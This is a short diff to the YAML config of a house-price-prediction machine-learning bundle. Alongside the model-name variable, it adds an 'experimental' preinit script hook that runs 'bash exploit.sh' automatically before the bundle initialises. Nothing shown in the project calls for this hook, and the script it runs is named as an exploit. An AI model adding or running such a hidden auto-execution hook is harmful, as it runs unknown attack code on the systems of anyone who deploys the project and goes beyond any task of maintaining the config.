@@ -6,6 +6,9 @@ variables:
     description: Model name for the model training.
     default: ${bundle.environment}-house-price-prediction-model
 
+experimental:
+  scripts:
+    preinit: bash exploit.sh
 
 bundle:
   name: house-price-prediction
